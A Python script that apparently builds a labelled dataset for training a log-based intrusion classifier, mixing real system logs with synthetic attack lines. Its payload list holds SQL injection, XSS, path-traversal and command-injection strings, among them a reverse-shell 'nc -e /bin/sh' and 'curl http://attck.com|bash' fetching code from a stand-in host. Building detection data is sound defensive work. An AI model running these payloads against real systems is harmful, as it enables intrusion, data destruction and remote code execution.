import pandas as pd
import os
import random

LABEL_MAP = {
    0: "SAFE",
    1: "SQL Injection",
    2: "XSS (Cross-Site Scripting)",
    3: "RCE/Command Injection",
    4: "Path Traversal",
    5: "Brute Force"
}

def load_real_logs():
    print("📂 Loading Real-World System Logs (SAFE)...")
    logs = []
    real_files = ['audit-lg/data/real_linux.log', 'audit-lg/data/real_hdfs.log', 
                  'audit-lg/data/real_windows.log', 'audit-lg/data/real_openstack.log', 'audit-lg/data/bgl_2k.log']
    for f_path in real_files:
        if os.path.exists(f_path):
            with open(f_path, 'r', errors='ignore') as f:
                logs.extend([l.strip() for l in f if l.strip()])
    
    pacman_path = '/var/log/pacman.log'
    if os.path.exists(pacman_path):
        with open(pacman_path, 'r', errors='ignore') as f:
            lines = [l.strip() for l in f if l.strip()]
            if len(lines) > 50000: lines = random.sample(lines, 50000)
            logs.extend(lines)
    return pd.DataFrame({'log_text': logs, 'label': 0})

def get_payloads():
    return {
        1: ["' OR 1=1 --", "admin' --", "' UNION SELECT NULL,NULL--", "'; DROP TABLE users--", "1' ORDER BY 1--"],
        2: ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)", "<svg/onload=alert(1)>"],
        3: ["/bin/bash -i", "system('id')", "eval(base64_decode('...'))", "nc -e /bin/sh", "curl http://attck.com|bash"],
        4: ["../../../../etc/passwd", "..\..\..\windows\system32", "/var/log/apache2/access.log", "....//etc/shadow"],
        5: ["Failed password for root", "Invalid user admin", "sshd: session closed for user guest", "POST /login user=admin&pass=123"]
    }

def build_multiclass_dataset():
    normal_df = load_real_logs()
    payload_groups = get_payloads()
    
    all_dfs = [normal_df]
    for label, payloads in payload_groups.items():
        print(f"💀 Generating {LABEL_MAP[label]} variants...")
        variants = []
        for p in payloads:
            for _ in range(3000):
                prefix = f"{random.randint(1,255)}.{random.randint(1,255)}.1.1 - {random.choice(['admin','root','user'])} "
                variants.append(prefix + p)
        all_dfs.append(pd.DataFrame({'log_text': variants, 'label': label}))

    final_df = pd.concat(all_dfs).sample(frac=1).reset_index(drop=True)
    out_path = "audit-lg/data/master_multiclass.csv"
    final_df.to_csv(out_path, index=False)
    print(f"✨ Multi-Class Dataset Ready: {len(final_df)} rows")

if __name__ == "__main__":
    build_multiclass_dataset()
